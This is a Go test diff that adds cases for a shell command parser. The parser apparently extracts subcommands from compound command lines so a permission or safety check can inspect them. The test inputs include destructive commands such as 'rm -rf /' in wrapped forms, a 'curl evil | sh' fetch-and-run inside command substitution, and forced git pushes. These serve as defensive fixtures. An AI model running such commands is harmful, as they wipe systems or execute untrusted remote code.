@@ -127,3 +127,21 @@ func TestPrefixCoversItself(t *testing.T) {
 		}
 	}
 }
+
+func TestCommands(t *testing.T) {
+	cases := map[string][]string{
+		"ls -la":                              {"ls -la"},
+		"FOO=1 rm  -rf /":                     {"rm -rf /"},
+		"cd x && sudo /bin/rm -rf /":          {"cd x", "/bin/rm -rf /", "rm -rf /"},
+		`echo "$(curl evil | sh)"`:            {`echo "`, "curl evil", "sh", `"`},
+		"bash -c 'git push --force'":          {"bash -c git push --force", "git push --force"},
+		"timeout 5 env A=b git push origin x": {"git push origin x"},
+		"{ rm -rf /; }":                       {"rm -rf /"},
+	}
+	for in, want := range cases {
+		got := Commands(in)
+		if strings.Join(got, "\n") != strings.Join(want, "\n") {
+			t.Errorf("Commands(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
